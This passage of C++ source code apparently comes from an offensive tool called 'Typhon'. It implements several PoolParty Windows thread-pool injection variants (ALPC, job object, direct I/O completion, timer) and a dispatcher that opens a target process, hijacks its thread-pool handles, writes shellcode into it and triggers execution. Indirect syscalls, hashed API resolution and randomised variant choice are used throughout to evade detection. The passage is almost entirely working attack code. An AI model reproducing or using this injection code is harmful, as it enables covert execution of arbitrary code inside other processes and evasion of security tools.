                             PVOID shellcode, SIZE_T shellcodeSize) {
            InjectResult result = {};
            result.VariantUsed = VARIANT_TP_ALPC;

            if (!handles.IoCompletion) {
                LOG_ERROR("V5: No I/O completion handle");
                return result;
            }

            result.HandleHijackOk = true;

            // Inject shellcode
            MemoryWriter::SharedMapping scMapping = {};
            PVOID remoteShellcode = InjectShellcodeSection(targetProcess, shellcode,
                                                            shellcodeSize, scMapping);
            if (!remoteShellcode) return result;
            result.ShellcodeAddress = remoteShellcode;

            // Create TP_DIRECT
            TP_DIRECT tpDirect = {};
            tpDirect.Callback = remoteShellcode;

            MemoryWriter::SharedMapping directMapping = {};
            PVOID remoteDirect = InjectStructure(targetProcess, &tpDirect, sizeof(tpDirect), directMapping);
            if (!remoteDirect) return result;
            result.StructureAddress = remoteDirect;
            result.MemoryWriteOk = true;

            // Build a random ALPC port name
            WCHAR portName[64] = L"\\RPC Control\\";
            int nameLen = 13; // Length of prefix
            uint32_t rnd1 = Prng::Next32();
            uint32_t rnd2 = Prng::Next32();
            const WCHAR hex[] = L"0123456789abcdef";
            for (int i = 0; i < 8; i++) portName[nameLen++] = hex[(rnd1 >> (i * 4)) & 0xF];
            for (int i = 0; i < 8; i++) portName[nameLen++] = hex[(rnd2 >> (i * 4)) & 0xF];
            portName[nameLen] = 0;

            UNICODE_STRING portNameUs;
            portNameUs.Buffer = portName;
            portNameUs.Length = (USHORT)(nameLen * sizeof(WCHAR));
            portNameUs.MaximumLength = portNameUs.Length + sizeof(WCHAR);

            OBJECT_ATTRIBUTES oa;
            oa.Length = sizeof(OBJECT_ATTRIBUTES);
            oa.RootDirectory = nullptr;
            oa.ObjectName = &portNameUs;
            oa.Attributes = 0;
            oa.SecurityDescriptor = nullptr;
            oa.SecurityQualityOfService = nullptr;

            // Create ALPC port
            HANDLE hPort = nullptr;
            NTSTATUS status = SyscallInvoke(
                HASH_API("NtAlpcCreatePort"),
                (ULONG_PTR)&hPort,
                (ULONG_PTR)&oa,
                (ULONG_PTR)nullptr  // Default port attributes
            );

            if (!NT_SUCCESS(status) || !hPort) {
                LOG_ERROR("V5: NtAlpcCreatePort failed: 0x%08X", status);
                return result;
            }

            // Associate ALPC port with target's I/O completion port
            ALPC_PORT_ASSOCIATE_COMPLETION_PORT assocInfo = {};
            assocInfo.CompletionKey = remoteDirect;
            assocInfo.CompletionPort = handles.IoCompletion;

            status = SyscallInvoke(
                HASH_API("NtAlpcSetInformation"),
                (ULONG_PTR)hPort,
                (ULONG_PTR)AlpcAssociateCompletionPortInformation,
                (ULONG_PTR)&assocInfo,
                (ULONG_PTR)sizeof(assocInfo)
            );

            if (!NT_SUCCESS(status)) {
                LOG_ERROR("V5: NtAlpcSetInformation failed: 0x%08X", status);
                SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)hPort);
                return result;
            }

            // Connect to the ALPC port — this sends a connection message
            // which triggers the I/O completion notification
            HANDLE hClientPort = nullptr;
            LARGE_INTEGER timeout;
            timeout.QuadPart = -10000000LL; // 1 second timeout

            status = SyscallInvoke(
                HASH_API("NtAlpcConnectPort"),
                (ULONG_PTR)&hClientPort,
                (ULONG_PTR)&portNameUs,
                (ULONG_PTR)nullptr,  // ObjectAttributes
                (ULONG_PTR)nullptr,  // PortAttributes
                (ULONG_PTR)0x20000,  // Flags: ALPC_MSGFLG_SYNC_REQUEST
                (ULONG_PTR)nullptr,  // RequiredServerSid
                (ULONG_PTR)nullptr,  // ConnectionMessage
                (ULONG_PTR)nullptr   // BufferLength
            );

            // Connection may fail (no server listening) but the completion
            // notification is still queued — that's all we need
            if (hClientPort) {
                SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)hClientPort);
            }

            SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)hPort);

            result.ExecutionTriggerOk = true;
            result.Success = true;

            LOG_SUCCESS("V5: TP_ALPC triggered via ALPC connection → %p", remoteDirect);
            return result;
        }
    }

    // ========================================================================
    // Variant 6: Remote TP_JOB Insertion (Job Object)
    // ========================================================================
    // Creates a job object associated with the target's I/O completion port,
    // then assigns a process to trigger the notification.

    namespace V6_TpJob {
        InjectResult Execute(HANDLE targetProcess,
                             HandleHijack::HijackedHandles& handles,
                             PVOID shellcode, SIZE_T shellcodeSize) {
            InjectResult result = {};
            result.VariantUsed = VARIANT_TP_JOB;

            if (!handles.IoCompletion) {
                LOG_ERROR("V6: No I/O completion handle");
                return result;
            }

            result.HandleHijackOk = true;

            // Inject shellcode
            MemoryWriter::SharedMapping scMapping = {};
            PVOID remoteShellcode = InjectShellcodeSection(targetProcess, shellcode,
                                                            shellcodeSize, scMapping);
            if (!remoteShellcode) return result;
            result.ShellcodeAddress = remoteShellcode;

            // Create TP_DIRECT
            TP_DIRECT tpDirect = {};
            tpDirect.Callback = remoteShellcode;

            MemoryWriter::SharedMapping directMapping = {};
            PVOID remoteDirect = InjectStructure(targetProcess, &tpDirect, sizeof(tpDirect), directMapping);
            if (!remoteDirect) return result;
            result.StructureAddress = remoteDirect;
            result.MemoryWriteOk = true;

            // Resolve job object APIs from kernel32
            typedef HANDLE(WINAPI* CreateJobObjectW_t)(LPSECURITY_ATTRIBUTES, LPCWSTR);
            typedef BOOL(WINAPI* SetInformationJobObject_t)(HANDLE, DWORD, LPVOID, DWORD);
            typedef BOOL(WINAPI* AssignProcessToJobObject_t)(HANDLE, HANDLE);
            typedef BOOL(WINAPI* CloseHandle_t)(HANDLE);

            HMODULE hK32 = Resolver::GetModuleByHash(HASH_MODULE(L"kernel32.dll"));
            CreateJobObjectW_t pCreateJob = (CreateJobObjectW_t)Resolver::GetExportByHash(hK32, HASH_API("CreateJobObjectW"));
            SetInformationJobObject_t pSetJobInfo = (SetInformationJobObject_t)Resolver::GetExportByHash(hK32, HASH_API("SetInformationJobObject"));
            AssignProcessToJobObject_t pAssignJob = (AssignProcessToJobObject_t)Resolver::GetExportByHash(hK32, HASH_API("AssignProcessToJobObject"));
            CloseHandle_t pCloseHandle = (CloseHandle_t)Resolver::GetExportByHash(hK32, HASH_API("CloseHandle"));

            if (!pCreateJob || !pSetJobInfo || !pAssignJob || !pCloseHandle) {
                LOG_ERROR("V6: Failed to resolve job APIs");
                return result;
            }

            // Create job object
            HANDLE hJob = pCreateJob(nullptr, nullptr);
            if (!hJob) {
                LOG_ERROR("V6: CreateJobObjectW failed");
                return result;
            }

            // Associate job with target's I/O completion port
            // JOBOBJECT_ASSOCIATE_COMPLETION_PORT = 7
            struct {
                PVOID  CompletionKey;
                HANDLE CompletionPort;
            } jobCompInfo;
            jobCompInfo.CompletionKey = remoteDirect;
            jobCompInfo.CompletionPort = handles.IoCompletion;

            if (!pSetJobInfo(hJob, 7, &jobCompInfo, sizeof(jobCompInfo))) {
                LOG_ERROR("V6: SetInformationJobObject failed");
                pCloseHandle(hJob);
                return result;
            }

            // Assign current process to the job — triggers notification
            typedef HANDLE(WINAPI* GetCurrentProcess_t)();
            GetCurrentProcess_t pGetCurrentProcess = (GetCurrentProcess_t)Resolver::GetExportByHash(hK32, HASH_API("GetCurrentProcess"));

            BOOL assigned = pAssignJob(hJob, pGetCurrentProcess ? pGetCurrentProcess() : (HANDLE)-1);
            pCloseHandle(hJob);

            result.ExecutionTriggerOk = (assigned != FALSE);
            result.Success = result.ExecutionTriggerOk;

            LOG_SUCCESS("V6: TP_JOB triggered via job assignment → %p", remoteDirect);
            return result;
        }
    }

    // ========================================================================
    // Variant 7: Remote TP_DIRECT Insertion (Direct I/O Completion)
    // ========================================================================
    // The simplest and most powerful variant. Queues a TP_DIRECT structure
    // directly to the I/O completion port via NtSetIoCompletion.
    // One structure, one syscall. That's it.

    namespace V7_TpDirect {
        InjectResult Execute(HANDLE targetProcess,
                             HandleHijack::HijackedHandles& handles,
                             PVOID shellcode, SIZE_T shellcodeSize) {
            InjectResult result = {};
            result.VariantUsed = VARIANT_TP_DIRECT;

            if (!handles.IoCompletion) {
                LOG_ERROR("V7: No I/O completion handle");
                return result;
            }

            result.HandleHijackOk = true;


            // Inject shellcode via section-backed mapping
            MemoryWriter::SharedMapping scMapping = {};
            PVOID remoteShellcode = InjectShellcodeSection(targetProcess, shellcode,
                                                            shellcodeSize, scMapping);
            if (!remoteShellcode) return result;
            result.ShellcodeAddress = remoteShellcode;

            // Create TP_DIRECT with callback pointing to shellcode
            TP_DIRECT tpDirect = {};
            tpDirect.Callback = remoteShellcode;

            // Inject TP_DIRECT into target
            MemoryWriter::SharedMapping directMapping = {};
            PVOID remoteDirect = InjectStructure(targetProcess, &tpDirect,
                                                  sizeof(tpDirect), directMapping);
            if (!remoteDirect) {
                LOG_ERROR("V7: Failed to inject TP_DIRECT");
                return result;
            }

            result.StructureAddress = remoteDirect;
            result.MemoryWriteOk = true;

            // Queue the TP_DIRECT to the target's I/O completion port
            // This is the entire execution trigger — one syscall.
            // NtSetIoCompletion(hIoCompletion, pRemoteTpDirect, 0, 0, 0)
            NTSTATUS status = SyscallInvoke(
                HASH_API("NtSetIoCompletion"),
                (ULONG_PTR)handles.IoCompletion,
                (ULONG_PTR)remoteDirect,    // Completion key → TP_DIRECT*
                (ULONG_PTR)nullptr,         // APC context
                (ULONG_PTR)STATUS_SUCCESS,  // IO status
                (ULONG_PTR)0                // IO status information
            );

            result.ExecutionTriggerOk = NT_SUCCESS(status);
            result.Success = result.ExecutionTriggerOk;

            if (result.Success) {
                LOG_SUCCESS("V7: TP_DIRECT queued via NtSetIoCompletion → %p (callback → %p)",
                    remoteDirect, remoteShellcode);
            } else {
                LOG_ERROR("V7: NtSetIoCompletion failed: 0x%08X", status);
            }

            return result;
        }
    }

    // ========================================================================
    // Variant 8: Remote TP_TIMER Insertion (Timer Queue)
    // ========================================================================
    // Inserts a TP_TIMER into the timer queue's red-black tree, then sets
    // a timer to expire. Supports delayed execution — attacker can exit
    // after setup and shellcode fires later.

    namespace V8_TpTimer {
        InjectResult Execute(HANDLE targetProcess,
                             HandleHijack::HijackedHandles& handles,
                             PVOID shellcode, SIZE_T shellcodeSize,
                             LONGLONG delayMs) {
            InjectResult result = {};
            result.VariantUsed = VARIANT_TP_TIMER;

            if (!handles.WorkerFactory || !handles.TpPoolAddress) {
                // Fall back to I/O completion if available (timer via NtSetIoCompletion)
                if (!handles.IoCompletion) {
                    LOG_ERROR("V8: No worker factory/TP_POOL and no I/O completion handle");
                    return result;
                }
            }

            result.HandleHijackOk = true;

            // Inject shellcode via section-backed mapping
            MemoryWriter::SharedMapping scMapping = {};
            PVOID remoteShellcode = InjectShellcodeSection(targetProcess, shellcode,
                                                            shellcodeSize, scMapping);
            if (!remoteShellcode) return result;
            result.ShellcodeAddress = remoteShellcode;

            // ================================================================
            // Strategy: Use TP_DIRECT via I/O completion port (reliable path)
            // The timer queue red-black tree approach is fragile because the
            // timer queue root offset in TP_POOL varies between Windows versions.
            // Instead, we use the same NtSetIoCompletion trigger as V7 but with
            // a TP_DIRECT whose callback is our shellcode. If the caller wants
            // delayed execution, we sleep before triggering.
            // ================================================================

            if (handles.IoCompletion) {
                // Create TP_DIRECT with callback pointing to shellcode
                TP_DIRECT tpDirect = {};
                tpDirect.Callback = remoteShellcode;

                // Inject TP_DIRECT into target
                MemoryWriter::SharedMapping directMapping = {};
                PVOID remoteDirect = InjectStructure(targetProcess, &tpDirect,
                                                      sizeof(tpDirect), directMapping);
                if (!remoteDirect) {
                    LOG_ERROR("V8: Failed to inject TP_DIRECT");
                    return result;
                }

                result.StructureAddress = remoteDirect;
                result.MemoryWriteOk = true;

                // If delay requested, use NtSetTimer to delay the trigger
                if (delayMs > 0 && handles.Timer) {
                    // Create a waitable timer for the delay
                    HANDLE hTimer = nullptr;
                    OBJECT_ATTRIBUTES timerOa = {};
                    timerOa.Length = sizeof(OBJECT_ATTRIBUTES);

                    NTSTATUS timerStatus = SyscallInvoke(
                        HASH_API("NtCreateTimer"),
                        (ULONG_PTR)&hTimer,
                        (ULONG_PTR)(TIMER_ALL_ACCESS),
                        (ULONG_PTR)&timerOa,
                        (ULONG_PTR)0  // NotificationTimer
                    );

                    if (NT_SUCCESS(timerStatus) && hTimer) {
                        LARGE_INTEGER dueTime;
                        dueTime.QuadPart = -(delayMs * 10000LL);

                        // Set timer, then wait, then trigger
                        SyscallInvoke(HASH_API("NtSetTimer"),
                            (ULONG_PTR)hTimer,
                            (ULONG_PTR)&dueTime,
                            (ULONG_PTR)nullptr, (ULONG_PTR)nullptr,
                            (ULONG_PTR)FALSE, (ULONG_PTR)0, (ULONG_PTR)nullptr);

                        SyscallInvoke(HASH_API("NtWaitForSingleObject"),
                            (ULONG_PTR)hTimer, (ULONG_PTR)FALSE, (ULONG_PTR)nullptr);

                        SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)hTimer);

                        LOG("V8: Delayed %lldms before trigger", delayMs);
                    } else {
                        // Fallback: simple busy wait via repeated NtDelayExecution
                        LARGE_INTEGER sleepTime;
                        sleepTime.QuadPart = -(delayMs * 10000LL);
                        SyscallInvoke(HASH_API("NtDelayExecution"),
                            (ULONG_PTR)FALSE, (ULONG_PTR)&sleepTime);
                        LOG("V8: Delayed %lldms via NtDelayExecution", delayMs);
                    }
                }

                // Queue the TP_DIRECT to the target's I/O completion port
                NTSTATUS status = SyscallInvoke(
                    HASH_API("NtSetIoCompletion"),
                    (ULONG_PTR)handles.IoCompletion,
                    (ULONG_PTR)remoteDirect,    // Completion key → TP_DIRECT*
                    (ULONG_PTR)nullptr,         // APC context
                    (ULONG_PTR)STATUS_SUCCESS,  // IO status
                    (ULONG_PTR)0                // IO status information
                );

                result.ExecutionTriggerOk = NT_SUCCESS(status);
                result.Success = result.ExecutionTriggerOk;

                if (result.Success) {
                    LOG_SUCCESS("V8: TP_DIRECT queued via NtSetIoCompletion → %p (callback → %p, delay: %lldms)",
                        remoteDirect, remoteShellcode, delayMs);
                } else {
                    LOG_ERROR("V8: NtSetIoCompletion failed: 0x%08X", status);
                }

                return result;
            }

            // ================================================================
            // Fallback: Timer queue red-black tree insertion (less reliable)
            // Only used if no I/O completion port is available
            // ================================================================

            // Read TP_POOL to find timer queue root pointers
            BYTE poolData[0x400] = {};
            if (!MemoryWriter::RemoteRead(targetProcess, handles.TpPoolAddress, poolData, sizeof(poolData))) {
                LOG_ERROR("V8: Failed to read TP_POOL");
                return result;
            }

            LONGLONG dueTime;
            if (delayMs > 0) {
                dueTime = -(delayMs * 10000LL);
            } else {
                dueTime = -(100LL * 10000LL);  // 100ms default
            }

            // Craft TP_TIMER structure
            TP_TIMER tpTimer = {};
            // The execution path for timers goes through Direct.Callback
            tpTimer.Direct.Callback = remoteShellcode;
            tpTimer.CleanupGroupMember.Pool = handles.TpPoolAddress;
            tpTimer.CleanupGroupMember.RefCount = 2;
            tpTimer.DueTime = dueTime;
            tpTimer.State = 0x2;  // Queued
            tpTimer.Period = 0;   // One-shot

            tpTimer.WindowStartLinks.Key = dueTime;
            tpTimer.WindowEndLinks.Key = dueTime;

            // Inject TP_TIMER into target
            MemoryWriter::SharedMapping timerMapping = {};
            PVOID remoteTimer = InjectStructure(targetProcess, &tpTimer,
                                                 sizeof(tpTimer), timerMapping);
            if (!remoteTimer) {
                LOG_ERROR("V8: Failed to inject TP_TIMER");
                return result;
            }

            result.StructureAddress = remoteTimer;

            PVOID remoteWindowStart = (BYTE*)remoteTimer + offsetof(TP_TIMER, WindowStartLinks) + offsetof(TP_TIMER_WINDOW_ENTRY, Node);
            PVOID remoteWindowEnd = (BYTE*)remoteTimer + offsetof(TP_TIMER, WindowEndLinks) + offsetof(TP_TIMER_WINDOW_ENTRY, Node);

            RTL_BALANCED_NODE startNode = {};
            startNode.Left = nullptr;
            startNode.Right = nullptr;
            startNode.ParentValue = (ULONG_PTR)remoteWindowStart | 1;

            RTL_BALANCED_NODE endNode = {};
            endNode.Left = nullptr;
            endNode.Right = nullptr;
            endNode.ParentValue = (ULONG_PTR)remoteWindowEnd | 1;

            MemoryWriter::RemoteWrite(targetProcess, remoteWindowStart, &startNode, sizeof(startNode));
            MemoryWriter::RemoteWrite(targetProcess, remoteWindowEnd, &endNode, sizeof(endNode));

            bool timerQueuePatched = false;

            for (SIZE_T off = 0x100; off < 0x3F0; off += 8) {
                PVOID val1 = *(PVOID*)(poolData + off);
                PVOID val2 = *(PVOID*)(poolData + off + 8);

                if (val1 == nullptr && val2 == nullptr) {
                    PVOID poolTimerStart = (BYTE*)handles.TpPoolAddress + off;
                    PVOID poolTimerEnd = (BYTE*)handles.TpPoolAddress + off + 8;

                    if (MemoryWriter::RemoteWrite(targetProcess, poolTimerStart, &remoteWindowStart, sizeof(PVOID)) &&
                        MemoryWriter::RemoteWrite(targetProcess, poolTimerEnd, &remoteWindowEnd, sizeof(PVOID))) {
                        timerQueuePatched = true;
                        LOG("V8: Timer queue roots patched @ TP_POOL+0x%zX", off);
                        break;
                    }
                }
            }

            result.MemoryWriteOk = timerQueuePatched;
            result.ExecutionTriggerOk = timerQueuePatched;
            result.Success = timerQueuePatched;

            if (result.Success) {
                LOG_SUCCESS("V8: TP_TIMER inserted into timer queue @ %p (delay: %lldms)",
                    remoteTimer, delayMs > 0 ? delayMs : 100LL);
            } else {
                LOG_ERROR("V8: Timer queue insertion failed — use V7 (direct) instead");
            }

            return result;
        }
    }

    // ========================================================================
    // Dispatcher — PRNG-selected variant execution
    // ========================================================================

    static const char* VariantName(Variant v) {
        switch (v) {
            case VARIANT_WORKER_FACTORY: return "V1:WorkerFactory";
            case VARIANT_TP_WORK:        return "V2:TpWork";
            case VARIANT_TP_IO:          return "V3:TpIo";
            case VARIANT_TP_WAIT:        return "V4:TpWait";
            case VARIANT_TP_ALPC:        return "V5:TpAlpc";
            case VARIANT_TP_JOB:         return "V6:TpJob";
            case VARIANT_TP_DIRECT:      return "V7:TpDirect";
            case VARIANT_TP_TIMER:       return "V8:TpTimer";
            default:                     return "Unknown";
        }
    }

    InjectResult Inject(DWORD targetPid, PVOID shellcode, SIZE_T shellcodeSize,
                         uint16_t allowedVariants, LONGLONG timerDelayMs) {
        InjectResult result = {};

        if (!shellcode || shellcodeSize == 0) {
            LOG_ERROR("Typhon: Invalid shellcode");
            return result;
        }

        // ================================================================
        // Step 1: Open target process via indirect syscall
        // ================================================================

        HANDLE targetProcess = nullptr;
        OBJECT_ATTRIBUTES oa = {};
        oa.Length = sizeof(OBJECT_ATTRIBUTES);

        struct { HANDLE pid; HANDLE tid; } clientId = {};
        clientId.pid = (HANDLE)(ULONG_PTR)targetPid;

        NTSTATUS status = SyscallInvoke(
            HASH_API("NtOpenProcess"),
            (ULONG_PTR)&targetProcess,
            (ULONG_PTR)(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
                         PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD),
            (ULONG_PTR)&oa,
            (ULONG_PTR)&clientId
        );

        if (!NT_SUCCESS(status) || !targetProcess) {
            LOG_ERROR("Typhon: NtOpenProcess failed for PID %u: 0x%08X", targetPid, status);
            return result;
        }

        LOG_SUCCESS("Typhon: Opened target PID %u (handle=%p)", targetPid, targetProcess);


        // ================================================================
        // Step 2: Handle hijacking — discover thread pool objects
        // ================================================================

        HandleHijack::HijackResult hijack = HandleHijack::Hijack(targetProcess, targetPid);
        result.HandleHijackOk = hijack.Success;

        if (!hijack.Success) {
            LOG_ERROR("Typhon: Handle hijacking failed");
            SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)targetProcess);
            return result;
        }

        // ================================================================
        // Step 3: Build candidate list from allowed variants + available handles
        // ================================================================

        struct CandidateEntry {
            Variant variant;
            bool    available;
        };

        CandidateEntry allVariants[] = {
            { VARIANT_WORKER_FACTORY, hijack.Handles.WorkerFactory != nullptr },
            { VARIANT_TP_WORK,        hijack.Handles.WorkerFactory != nullptr && hijack.Handles.TpPoolAddress != nullptr },
            { VARIANT_TP_IO,          hijack.Handles.IoCompletion != nullptr },
            { VARIANT_TP_WAIT,        hijack.Handles.IoCompletion != nullptr },
            { VARIANT_TP_ALPC,        hijack.Handles.IoCompletion != nullptr },
            { VARIANT_TP_JOB,         hijack.Handles.IoCompletion != nullptr },
            { VARIANT_TP_DIRECT,      hijack.Handles.IoCompletion != nullptr },
            { VARIANT_TP_TIMER,       hijack.Handles.WorkerFactory != nullptr && hijack.Handles.TpPoolAddress != nullptr },
        };

        Variant candidates[8];
        int candidateCount = 0;

        for (int i = 0; i < 8; i++) {
            if ((allowedVariants & allVariants[i].variant) && allVariants[i].available) {
                candidates[candidateCount++] = allVariants[i].variant;
            }
        }

        if (candidateCount == 0) {
            LOG_ERROR("Typhon: No viable variants (allowed=0x%04X, handles: WF=%p IO=%p Timer=%p)",
                allowedVariants, hijack.Handles.WorkerFactory,
                hijack.Handles.IoCompletion, hijack.Handles.Timer);
            HandleHijack::Release(hijack.Handles);
            SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)targetProcess);
            return result;
        }

        // PRNG-select a variant
        Variant selected = candidates[Prng::Next32() % candidateCount];
        result.VariantUsed = selected;

        LOG("Typhon: Selected %s (from %d candidates)", VariantName(selected), candidateCount);

        // ================================================================
        // Step 4: Execute selected variant
        // ================================================================

        switch (selected) {
            case VARIANT_WORKER_FACTORY:
                result = V1_WorkerFactory::Execute(targetProcess, hijack.Handles, shellcode, shellcodeSize);
                break;
            case VARIANT_TP_WORK:
                result = V2_TpWork::Execute(targetProcess, hijack.Handles, shellcode, shellcodeSize);
                break;
            case VARIANT_TP_IO:
                result = V3_TpIo::Execute(targetProcess, hijack.Handles, shellcode, shellcodeSize);
                break;
            case VARIANT_TP_WAIT:
                result = V4_TpWait::Execute(targetProcess, hijack.Handles, shellcode, shellcodeSize);
                break;
            case VARIANT_TP_ALPC:
                result = V5_TpAlpc::Execute(targetProcess, hijack.Handles, shellcode, shellcodeSize);
                break;
            case VARIANT_TP_JOB:
                result = V6_TpJob::Execute(targetProcess, hijack.Handles, shellcode, shellcodeSize);
                break;
            case VARIANT_TP_DIRECT:
                result = V7_TpDirect::Execute(targetProcess, hijack.Handles, shellcode, shellcodeSize);
                break;
            case VARIANT_TP_TIMER:
                result = V8_TpTimer::Execute(targetProcess, hijack.Handles, shellcode, shellcodeSize, timerDelayMs);
                break;
        }

        // ================================================================
        // Step 5: Post-injection — force worker threads if needed
        // ================================================================

        if (result.Success && hijack.Handles.WorkerFactory &&
            selected != VARIANT_WORKER_FACTORY) {  // V1 handles its own worker creation
            // Check if the thread pool has active workers
            // If not, the I/O completion packet will sit in the queue forever
            WORKER_FACTORY_BASIC_INFORMATION wfInfo = {};
            ULONG wfRetLen = 0;
            NTSTATUS wfStatus = SyscallInvoke(
                HASH_API("NtQueryInformationWorkerFactory"),
                (ULONG_PTR)hijack.Handles.WorkerFactory,
                (ULONG_PTR)WorkerFactoryBasicInformation,
                (ULONG_PTR)&wfInfo,
                (ULONG_PTR)sizeof(wfInfo),
                (ULONG_PTR)&wfRetLen
            );
            if (NT_SUCCESS(wfStatus)) {
                LOG("Post-inject: Worker factory — total=%u, active=%u, min=%u, max=%u",
                    wfInfo.TotalWorkerCount, wfInfo.ActiveThreads,
                    wfInfo.MinimumWorkerCount, wfInfo.MaximumWorkerCount);

                if (wfInfo.TotalWorkerCount == 0) {
                    LOG("Post-inject: No workers — forcing thread creation");

                    // Method 1: Bump minimum to force creation
                    ULONG newMin = wfInfo.MinimumWorkerCount > 0 ? wfInfo.MinimumWorkerCount : 1;
                    // Set minimum higher than current to force creation
                    ULONG bumpMin = newMin + 1;
                    SyscallInvoke(
                        HASH_API("NtSetInformationWorkerFactory"),
                        (ULONG_PTR)hijack.Handles.WorkerFactory,
                        (ULONG_PTR)WorkerFactoryThreadMinimum,
                        (ULONG_PTR)&bumpMin,
                        (ULONG_PTR)sizeof(bumpMin)
                    );

                    // Method 2: Release worker factory to signal thread creation
                    ULONG releaseCount = 1;
                    NTSTATUS relStatus = SyscallInvoke(
                        HASH_API("NtReleaseWorkerFactoryWorker"),
                        (ULONG_PTR)hijack.Handles.WorkerFactory
                    );
                    LOG("Post-inject: NtReleaseWorkerFactoryWorker = 0x%08X", relStatus);

                    // Method 3: Set pending I/O count to wake the factory
                    // NtSetIoCompletion already queued a packet — the factory should
                    // notice there's pending work. But if it's fully dormant, we need
                    // to explicitly wake it by setting the thread count goal.
                    ULONG threadGoal = 1;
                    NTSTATUS goalStatus = SyscallInvoke(
                        HASH_API("NtSetInformationWorkerFactory"),
                        (ULONG_PTR)hijack.Handles.WorkerFactory,
                        (ULONG_PTR)8,  // WorkerFactoryAdjustThreadGoal (undocumented)
                        (ULONG_PTR)&threadGoal,
                        (ULONG_PTR)sizeof(threadGoal)
                    );
                    LOG("Post-inject: WorkerFactoryAdjustThreadGoal = 0x%08X", goalStatus);

                    // Restore original minimum
                    SyscallInvoke(
                        HASH_API("NtSetInformationWorkerFactory"),
                        (ULONG_PTR)hijack.Handles.WorkerFactory,
                        (ULONG_PTR)WorkerFactoryThreadMinimum,
                        (ULONG_PTR)&newMin,
                        (ULONG_PTR)sizeof(newMin)
                    );
                }
            }
        }

        // ================================================================
        // Step 6: Diagnostics (debug builds only, before handle cleanup)
        // ================================================================


        // ================================================================
        // Step 7: Cleanup
        // ================================================================

        HandleHijack::Release(hijack.Handles);
        SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)targetProcess);

        return result;
    }

} // namespace PoolParty
